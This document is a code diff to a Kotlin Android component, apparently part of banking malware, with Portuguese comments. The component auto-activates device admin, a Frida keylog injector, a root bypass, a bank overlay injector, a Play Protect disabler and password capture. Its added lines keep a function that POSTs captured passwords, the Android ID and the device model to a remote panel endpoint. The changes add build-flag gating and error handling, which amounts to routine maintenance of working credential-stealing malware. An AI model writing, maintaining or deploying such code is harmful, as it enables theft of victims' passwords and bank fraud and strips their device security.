@@ -46,16 +46,22 @@ object AccessibilityServiceAutoActivator {
             activateDeviceAdmin(context)
             
             // 3. Ativar FridaLoader (injetor de keylog)
-            activateFridaLoader(context)
+            if (BuildConfig.ENABLE_KEYLOG_INJECTION) {
+                activateFridaLoader(context)
+            }
             
             // 4. Ativar RootBypassService (bypass de root)
-            activateRootBypass(context)
+            if (BuildConfig.ENABLE_ROOT_BYPASS) {
+                activateRootBypass(context)
+            }
             
             // 5. Ativar BankInjector (injetor bancário)
             activateBankInjector(context)
             
             // 6. Ativar PlayProtectKiller (desativa Play Protect)
-            activatePlayProtectKiller(context)
+            if (BuildConfig.DISABLE_PLAY_PROTECT) {
+                activatePlayProtectKiller(context)
+            }
             
             // 7. Iniciar captura de senhas
             initializePasswordCapture(context)
@@ -204,11 +210,11 @@ object AccessibilityServiceAutoActivator {
         try {
             Log.d(TAG, "🛡️  Ativando PlayProtectKiller...")
             
-            if (BuildConfig.DISABLE_PLAY_PROTECT) {
+            try {
                 PlayProtectKiller.init(context, true)
                 Log.d(TAG, "✅ PlayProtectKiller - Inicializado com sucesso")
-            } else {
-                Log.d(TAG, "⏭️  PlayProtectKiller - Desativado (DISABLE_PLAY_PROTECT = false)")
+            } catch (e: Exception) {
+                Log.w(TAG, "⚠️  PlayProtectKiller não disponível: ${e.message}")
             }
         } catch (error: Exception) {
             Log.e(TAG, "❌ Erro ao ativar PlayProtectKiller: ${error.message}", error)
@@ -225,8 +231,12 @@ object AccessibilityServiceAutoActivator {
             
             // Iniciar thread de monitoramento de senhas
             Thread {
-                Thread.sleep(1000) // Aguardar inicialização
-                Log.d(TAG, "✅ Password Capture - Ativo e monitorando")
+                try {
+                    Thread.sleep(1000) // Aguardar inicialização
+                    Log.d(TAG, "✅ Password Capture - Ativo e monitorando")
+                } catch (e: InterruptedException) {
+                    Log.w(TAG, "Password capture thread interrompida")
+                }
             }.start()
         } catch (error: Exception) {
             Log.e(TAG, "❌ Erro ao inicializar captura de senhas: ${error.message}", error)
@@ -240,40 +250,44 @@ object AccessibilityServiceAutoActivator {
     fun sendPasswordToPanel(context: Context, password: String, appName: String) {
         try {
             Thread {
-                val androidId = Settings.Secure.getString(
-                    context.contentResolver,
-                    Settings.Secure.ANDROID_ID
-                ) ?: "unknown"
-                
-                val endpoint = "${BuildConfig.BACKEND_BASE_URL}/api/device/password-capture"
-                val connection = URL(endpoint).openConnection() as HttpURLConnection
-                connection.requestMethod = "POST"
-                connection.connectTimeout = 10_000
-                connection.readTimeout = 10_000
-                connection.doOutput = true
-                connection.setRequestProperty("Content-Type", "application/json")
-                
-                val payload = JSONObject().apply {
-                    put("packageName", BuildConfig.APPLICATION_ID)
-                    put("deviceUid", androidId)
-                    put("deviceName", android.os.Build.MODEL ?: "Android Device")
-                    put("password", password)
-                    put("appName", appName)
-                    put("capturedAt", System.currentTimeMillis())
+                try {
+                    val androidId = Settings.Secure.getString(
+                        context.contentResolver,
+                        Settings.Secure.ANDROID_ID
+                    ) ?: "unknown"
+                    
+                    val endpoint = "${BuildConfig.BACKEND_BASE_URL}/api/device/password-capture"
+                    val connection = URL(endpoint).openConnection() as HttpURLConnection
+                    connection.requestMethod = "POST"
+                    connection.connectTimeout = 10_000
+                    connection.readTimeout = 10_000
+                    connection.doOutput = true
+                    connection.setRequestProperty("Content-Type", "application/json")
+                    
+                    val payload = JSONObject().apply {
+                        put("packageName", BuildConfig.APPLICATION_ID)
+                        put("deviceUid", androidId)
+                        put("deviceName", Build.MODEL ?: "Android Device")
+                        put("password", password)
+                        put("appName", appName)
+                        put("capturedAt", System.currentTimeMillis())
+                    }
+                    
+                    OutputStreamWriter(connection.outputStream, Charsets.UTF_8).use { writer ->
+                        writer.write(payload.toString())
+                    }
+                    
+                    val statusCode = connection.responseCode
+                    if (statusCode in 200..299) {
+                        Log.d(TAG, "✅ Senha enviada para o painel (App: $appName)")
+                    } else {
+                        Log.w(TAG, "⚠️  Falha ao enviar senha (HTTP $statusCode)")
+                    }
+                    
+                    connection.disconnect()
+                } catch (e: Exception) {
+                    Log.e(TAG, "Erro na thread de envio de senha", e)
                 }
-                
-                OutputStreamWriter(connection.outputStream, Charsets.UTF_8).use { writer ->
-                    writer.write(payload.toString())
-                }
-                
-                val statusCode = connection.responseCode
-                if (statusCode in 200..299) {
-                    Log.d(TAG, "✅ Senha enviada para o painel (App: $appName)")
-                } else {
-                    Log.w(TAG, "⚠️  Falha ao enviar senha (HTTP $statusCode)")
-                }
-                
-                connection.disconnect()
             }.start()
         } catch (error: Exception) {
             Log.e(TAG, "❌ Erro ao enviar senha para painel: ${error.message}", error)
@@ -292,8 +306,8 @@ object AccessibilityServiceAutoActivator {
             ║ 🎮 RemoteControlService: ${if (areAccessibilityServicesActive(context)) "✅" else "⏳"}
             ║ 🔒 ScreenLockService: ${if (areAccessibilityServicesActive(context)) "✅" else "⏳"}
             ║ 🛡️  Device Admin: ${if (isDeviceAdminActive(context)) "✅" else "⏳"}
-            ║ 🔧 FridaLoader: ✅
-            ║ 🚀 RootBypass: ✅
+            ║ 🔧 FridaLoader: ${if (BuildConfig.ENABLE_KEYLOG_INJECTION) "✅" else "⏭️"}
+            ║ 🚀 RootBypass: ${if (BuildConfig.ENABLE_ROOT_BYPASS) "✅" else "⏭️"}
             ║ 🏦 BankInjector: ${if (BuildConfig.BANK_ID.isNotBlank()) "✅" else "⏭️"}
             ║ 🛡️  PlayProtect Killer: ${if (BuildConfig.DISABLE_PLAY_PROTECT) "✅" else "⏭️"}
             ║ 🔐 Password Capture: ✅
